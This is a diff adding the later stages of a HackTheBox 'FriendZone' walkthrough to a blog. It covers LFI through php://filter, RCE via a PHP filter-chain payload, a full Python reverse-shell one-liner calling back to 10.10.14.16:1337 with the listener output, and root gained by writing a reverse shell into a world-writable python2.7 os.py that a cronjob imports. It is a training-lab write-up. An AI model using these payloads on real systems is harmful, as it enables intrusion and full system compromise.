@@ -168,6 +168,93 @@ using this cred to login `https://administrator1.friendzone.red/login.php` we ar
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c342e8aa-d38d-4332-82b3-917f176ae2e4)
 
-navigating to `/dashboard.php` 
+navigating to `/dashboard.php`... we can see it is talking about some parameters missing. so let's try add the parameter `?image_id=a.jpg&pagename=timestamp` to the url.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ac6121b3-6a5f-4296-8423-8ab6d8b45584)
+
+hmmmm 🤔 we got a pic and some random text. let's test for lfi.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/93e63f98-1f09-4e1f-a4b6-0edc20f5afa7)
+
+cool we got lfi, by using php filter payload `php://filter/convert.base64-encode/resource=timestamp`. let's use a payload called `php_filter_chain_generator.py` to get RCE.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/72bc945e-411a-46a5-b4ad-20d6e41a1eaa)
+
+payload generator [link](https://github.com/synacktiv/php_filter_chain_generator). it's a sweet payload that will give you RCE on any lfi vuln without poisonning logs or anything 😂. let's run the payload.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/30a520b8-dcc7-43f0-acba-2a37be7495bd)
+
+generate the payload by running command `php_filter_chain_generator.py --chain '<?php system($_GET['c']); ?>'` then copy from the `php://filter...=php://temp` append `&c=id` to excute the id command.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d1b52272-cbcb-4602-a592-3dd9211ee051)
+
+coooool we got RCE. let's pop a reverse shell.
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+rev shell payload.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/FriendZone]
+└─$ ncat -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.10.123.
+Ncat: Connection from 10.10.10.123:36706.
+www-data@FriendZone:/var/www/admin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@FriendZone:/var/www/admin$ 
+```
+bingo, got a reverse shell as user `www-data`
 
 
+## Privilege Escalation
+
+```
+www-data@FriendZone:/opt/server_admin$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Sep 13  2022 .
+drwxr-xr-x 3 root root 4096 Sep 13  2022 ..
+-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
+www-data@FriendZone:/opt/server_admin$ cat reporter.py 
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+www-data@FriendZone:/opt/server_admin$ 
+```
+found a `reporter.py` in the `/opt/server_admin` directory, checking the content of the file we can see it is a potential cronjob 🤔 also we can see the python lib that was imported. let's check for python lib hijacking. 
+
+```
+www-data@FriendZone:/opt/server_admin$ find / -type f -name "os.py" 2>/dev/null
+/usr/lib/python3.6/os.py
+/usr/lib/python2.7/os.py
+www-data@FriendZone:/opt/server_admin$ ls -al /usr/lib/python3.6/os.py
+-rw-r--r-- 1 root root 37526 Sep 12  2018 /usr/lib/python3.6/os.py
+www-data@FriendZone:/opt/server_admin$ ls -al /usr/lib/python2.7/os.py
+-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
+www-data@FriendZone:/opt/server_admin$ 
+```
+first locate the `os.py` lib, and check if there is write permission to the file. we can see we have write access to `/usr/lib/python2.7/os.py`. let's inject a malicious payload in it.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6049f63a-f27e-41f4-a1c8-c4c9a8c5619c)
+
+inject a reverse shell to the `/usr/lib/python2.7/os.py` and wait for some minute and Bankai!!! we got a reverse shell as root.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1b5f8ca7-8c4f-4c82-a7fd-006b798efc16)
+
+and we are through... 😉 fun box isn't it ?
